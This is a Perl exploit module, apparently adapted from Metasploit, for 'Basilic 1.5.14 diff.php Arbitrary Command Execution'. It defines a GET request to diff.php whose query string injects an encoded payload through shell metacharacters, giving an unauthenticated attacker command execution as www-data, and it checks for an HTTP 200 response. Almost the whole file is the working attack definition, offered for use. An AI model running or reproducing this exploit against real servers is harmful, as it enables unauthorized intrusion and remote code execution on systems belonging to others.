package BASILIC::MSF::BasilicDiffExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "BasilicDiffExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module abuses a metacharacter injection vulnerability in the

        diff.php script. This flaw allows an unauthenticated attacker to execute arbitrary

        commands as the www-data user account.

      ",
  METHOD => "GET",
  MSF_MODULE => "basilic_diff_exec",
  OSVDB => 83719,
  PATH => "file=__FILE__&new=1&old=2&file=&__PAYLOAD\\.ENCODED__#&new=1&old=2&",
  PATHS => ["basilic-1.5.14/"],
  TITLE => "Basilic 1.5.14 diff.php Arbitrary Command Execution",
  VARIABLES => {
    'FILE' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The base path to Basilic",
  VALUE => "/basilic-1.5.14/",
},
    'BASE' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
